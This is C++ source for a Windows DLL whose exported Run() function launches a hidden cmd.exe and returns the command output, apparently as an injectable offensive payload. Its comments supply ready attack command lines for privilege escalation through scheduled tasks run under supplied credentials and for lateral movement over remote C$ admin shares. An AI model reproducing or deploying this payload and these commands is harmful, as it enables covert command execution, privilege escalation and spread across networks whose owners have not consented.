#include "pch.h"
#include <windows.h>
#include <string>
#include <memory>

// Static buffer to store command output
static char output_buffer[32768] = { 0 };

extern "C" __declspec(dllexport) const char* Run() {
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hChildStdoutRd, hChildStdoutWr;

    // Create pipe for stdout
    if (!CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0)) {
        strcpy_s(output_buffer, "Failed to create pipe");
        return output_buffer;
    }

    // Ensure the read handle to the pipe is not inherited
    SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdError = hChildStdoutWr;
    si.hStdOutput = hChildStdoutWr;
    si.dwFlags |= STARTF_USESTDHANDLES;
    ZeroMemory(&pi, sizeof(pi));

  // "cmd.exe /c whoami"
  // "cmd.exe /c ping 8.8.8.8"
  // For blind privilege escalation due to schtasks open a different cmd process: "cmd.exe /c schtasks /create /tn TempTask /tr \"cmd /k mkdir test\" /ru USERNAME /rp PASSWORD /sc once /st 00:00 /f && schtasks /run /tn TempTask && timeout /t 5 >nul && schtasks /delete /tn TempTask /f"
  // For privilege escalation with a response: "cmd.exe /c schtasks /create /tn TempTask /tr \"cmd /c whoami > C:\\\\temp\\\\filename.txt\" /ru USERNAME /rp PASSWORD /sc once /st 00:00 /f && schtasks /run /tn TempTask && timeout /t 2 >nul && type C:\\\\temp\\\\filename.txt && del C:\\\\temp\\\\filename.txt && schtasks /delete /tn TempTask /f";
  // For network lateral movement with response: "cmd.exe /c net use \\\\IP\\C$ /user:USERNAME PASSWORD && echo File Created > \\\\IP\\C$\\Temp\\filename.txt && type \\\\IP\\C$\\Temp\\filename.txt && del \\\\IP\\C$\\Temp\\filename.txt && net use \\\\IP\\C$ /delete /y"
  // Change the cmdLine command to the one you need to use. It can handle multiple commands in parallel.
    char cmdLine[] = "cmd.exe /c dir";
    BOOL success = CreateProcessA(
        NULL,
        cmdLine,
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        CloseHandle(hChildStdoutRd);
        CloseHandle(hChildStdoutWr);
        sprintf_s(output_buffer, "Failed to create process. Error: %lu", GetLastError());
        return output_buffer;
    }

    // Close the write end of the pipe
    CloseHandle(hChildStdoutWr);

    // Read output from the child process
    DWORD dwRead;
    CHAR chBuf[4096];
    BOOL bSuccess = FALSE;
    DWORD totalRead = 0;

    while (TRUE) {
        bSuccess = ReadFile(hChildStdoutRd, chBuf, 4095, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;

        // Ensure null termination
        chBuf[dwRead] = '\0';

        // Safely append to output buffer
        if (totalRead + dwRead < sizeof(output_buffer) - 1) {
            strcat_s(output_buffer + totalRead, sizeof(output_buffer) - totalRead, chBuf);
            totalRead += dwRead;
        }
    }

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, 5000);

    // Clean up
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hChildStdoutRd);

    return output_buffer;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
